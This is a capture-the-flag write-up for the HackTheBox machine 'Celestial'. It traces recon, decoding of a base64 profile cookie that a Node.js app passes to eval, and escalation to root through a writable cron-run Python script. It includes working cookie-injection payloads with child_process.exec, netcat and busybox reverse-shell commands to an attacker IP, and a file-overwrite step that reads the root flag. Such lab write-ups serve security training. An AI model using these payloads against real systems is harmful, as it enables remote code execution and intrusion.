# Celestial: Medium

```sh
sudo vim /etc/hosts
# add celestial.htb

nmap -T4 -p- -A -Pn -v celestial.htb
```

* open ports & services:

    * 3000/tcp: http: Node.js Express framework

* the page on port 3000 contains the number 404, and no other content is seen

* web scan:

    ```sh
    feroxbuster -u http://celestial.htb:3000 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx,js,json,docx,pdf,cgi,sql,xml,tar,gz,db --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan using small wordlist and multiple extensions

    ffuf -c -u "http://celestial.htb:3000" -H "Host: FUZZ.celestial.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 12 -s
    # subdomain scan

    feroxbuster -u http://celestial.htb:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,sh,md,js,json --extract-links --scan-limit 3 --filter-status 400,401,404,405,500 --silent
    # dir scan with medium wordlist and lesser extensions
    ```

* the directory and subdomain scans do not give anything

* we can check more on the request and response headers next:

    ```sh
    curl -I -v http://celestial.htb:3000
    ```

* this shows that there is a non-default cookie set: "profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D"

* we can try decoding this in CyberChef: using 'URL Decode', followed by 'Decode from Base64', we get the following JSON string:

    ```json
    {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
    ```

* we can try modifying the 'num' value first to other integers, to check for IDOR:

    * we can change the 'num' value in the JSON string, and use 'Encode to Base64', then 'URL Encode': this creates the updated cookie string

    * in Developer Tools, we can update the cookie value and refresh to check for any changes

    * if we set the 'num' value to 1, we get the message "Hey Dummy 1 + 1 is 11"

    * if we set the 'num' value to 0, we get the message "Hey Dummy + is undefined"

    * if we set the 'num' value to 3, we get the message "Hey Dummy 3 + 3 is 33"

    * if we set the 'num' value to -1, we get the message "Hey Dummy -1 + -1 is -2"

* as seen from the tests for the 'num' value, it is taking the number value as it is, and doing an operation on it: for positive numbers it is doing string concatenation, and for negative numbers it is doing addition

* if we use a string value instead of an integer for the 'num' value, we get a verbose ReferenceError message:

    ```js
    ReferenceError: testtest is not defined
        at eval (eval at <anonymous> (/home/sun/server.js:13:29), <anonymous>:1:1)
        at /home/sun/server.js:13:16
        at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
        at next (/home/sun/node_modules/express/lib/router/route.js:137:13)
        at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)
        at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
        at /home/sun/node_modules/express/lib/router/index.js:281:22
        at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)
        at next (/home/sun/node_modules/express/lib/router/index.js:275:10)
        at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)
    ```

* this shows that the webapp is using JS and also provides a username 'sun'

* the error message also mentions the ```eval``` function: which could be likely used for the addition logic

* we can check for RCE using the NodeJS reverse shell one-liner payload from [revshells](https://www.revshells.com/) for reference:

    * set up a listener for pings using ```sudo tcpdump -i tun0 icmp```

    * if we set the 'num' value to the payload ```require('child_process').exec('ping -c 4 10.10.14.95')```, and update the modified cookie value, we get an 'Unexpected Identifier' error

    * however, if we use a semicolon in the payload like ```require('child_process').exec('ping -c 4 10.10.14.95');```, this time the page reflects the addition message; and we get the ICMP packets on our listener

* we can use this same method to get reverse shell:

    * setup a listener: ```nc -nvlp 4444```

    * set the 'num' value to the payload ```require('child_process').exec('nc -e sh 10.10.14.95 4444');```

    * update the value in the cookie string, and encode it, then update the cookie value and refresh the page

    * we do not get the reverse shell using this payload, but command execution is working as confirmed earlier

    * we can use a different payload for the reverse shell command, like ```require('child_process').exec('busybox nc 10.10.14.95 4444 -e sh');```

    * now, if we update the encoded cookie value, we get a shell on our listener

* in reverse shell:

    ```sh
    id
    # 'sun' user

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/home/sun'

    ls -la

    cat user.txt
    # user flag

    ls -la /home
    # we have only one user 'sun'

    ls -laR
    # check all files recursively

    cat server.js
    # includes logic for webapp

    cat output.txt
    # contains a single lin of output

    cat Documents/script.py
    # script that prints it is running

    sudo -l
    # requires password
    ```

* the script file 'script.py' contains the code ```print "Script is running..."```, and the file 'output.txt' contains the line "Script is running..."

* also, ```ls -la``` shows that the file 'output.txt' was very recently updated, and if we check the file time again, it shows it is getting updated once every few minutes

* it is likely that the script is run as a cronjob, and its output is written to the 'output.txt' file: we can verify that using ```pspy``` if needed

* in this case, we can try modifying the script first:

    ```sh
    ls -la Documents/script.py
    # we have write permissions

    echo "import os; print(os.popen('cat /root/root.txt').read())" > Documents/script.py
    ```

* after a few minutes, we can check the 'output.txt' file:

    ```sh
    ls -la output.txt
    # the file is updated

    cat output.txt
    # we get the root flag
    ```
